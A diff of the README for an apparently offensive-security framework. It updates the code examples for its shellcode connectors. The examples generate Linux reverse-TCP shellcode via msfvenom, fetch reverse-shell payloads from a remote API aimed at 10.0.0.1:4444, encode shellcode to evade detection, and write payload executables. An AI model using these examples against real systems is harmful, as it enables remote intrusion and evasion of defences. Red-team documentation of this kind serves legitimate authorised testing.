@@ -66,7 +66,7 @@ Cross-platform Java-based reverse TCP payloads that work on any system with JVM.
 The `base.py` module provides the `ShellcodeConnector` base class for creating custom shellcode generators:
 
 ```python
-from ofx.data.shellcode.connectors.base import ShellcodeConnector
+from ofx.api.exploitation.shellcode.connectors.base import ShellcodeConnector
 
 class MyShellcode(ShellcodeConnector):
     def __init__(self):
@@ -86,7 +86,7 @@ class MyShellcode(ShellcodeConnector):
 Use `msfvenom.py` to generate shellcode using Metasploit Framework:
 
 ```python
-from ofx.data.shellcode.connectors.msfvenom import MsfvenomConnector
+from ofx.api.exploitation.shellcode.connectors.msfvenom import MsfvenomConnector
 
 connector = MsfvenomConnector(
     payload="linux/x64/shell_reverse_tcp",
@@ -108,12 +108,19 @@ The `example_connector.py` shows how to create a custom connector that:
 Fetch shellcode from remote sources:
 
 ```python
-from ofx.data.shellcode.connectors.remote import RemoteShellcodeConnector
+from ofx.api.exploitation.shellcode.connectors.remote import RemoteHTTPConnector
 
-connector = RemoteShellcodeConnector(
-    url="https://example.com/shellcode.bin"
+connector = RemoteHTTPConnector(
+    base_url="https://example.com/api",
+    api_key="secret-key"
 )
-shellcode = connector.fetch()
+shellcode = connector.generate(
+    os_target="linux",
+    arch="x64",
+    shell_type="reverse",
+    ip="10.0.0.1",
+    port=4444,
+)
 ```
 
 ## Using Shellcode in Workflows
@@ -149,16 +156,12 @@ jobs:
     steps:
       - name: Load custom shellcode
         script: |
-          from ofx.data.shellcode.connectors.base import ShellcodeConnector
-          
-          connector = ShellcodeConnector(
-              os_target='windows',
-              arch='x64'
-          )
+          from pathlib import Path
+          from ofx.api.exploitation.shellcode.encoder import encode_xor
           
           # Add custom processing
-          raw_bytes = connector.load_from_file('payload.bin')
-          encoded = connector.encode_xor(raw_bytes, key=0x42)
+          raw_bytes = Path('payload.bin').read_bytes()
+          encoded = encode_xor(raw_bytes, key=0x42)
           
           print(encoded.hex())
 ```
@@ -174,13 +177,13 @@ Most connectors support various encoding methods to avoid detection:
 
 Example:
 ```python
-from ofx.api.exploitation.shellcode.encoder import encode_xor, encode_alpha
+from ofx.api.exploitation.shellcode.encoder import encode_xor, encode_alphanum
 
 # XOR encoding
 encoded = encode_xor(shellcode, key=0xAA)
 
 # Alphanumeric encoding
-alpha_shellcode = encode_alpha(shellcode)
+alpha_shellcode = encode_alphanum(shellcode)
 ```
 
 ## Output Formats
@@ -243,14 +246,12 @@ docker run --rm -v $(pwd):/work shellcode-builder
 Always test in a safe, isolated environment:
 
 ```python
-from ofx.api.exploitation.shellcode import test_shellcode
+from ofx.api.exploitation.shellcode import ShellcodeToExe
 
-# Test if shellcode executes without crashing
-result = test_shellcode(
-    shellcode=your_shellcode,
-    timeout=5,
-    sandbox=True  # Use sandboxed environment
-)
+# Convert shellcode to an executable for controlled testing
+exe = ShellcodeToExe(your_shellcode, arch="x64", os_target="linux")
+path = exe.write("/tmp/payload")
+print(f"Wrote executable: {path}")
 ```
 
 ## Best Practices
@@ -279,7 +280,7 @@ To create your own shellcode connector:
 
 1. **Extend Base Class:**
 ```python
-from ofx.data.shellcode.connectors.base import ShellcodeConnector
+from ofx.api.exploitation.shellcode.connectors.base import ShellcodeConnector
 
 class MyCustomConnector(ShellcodeConnector):
     def __init__(self, custom_param):
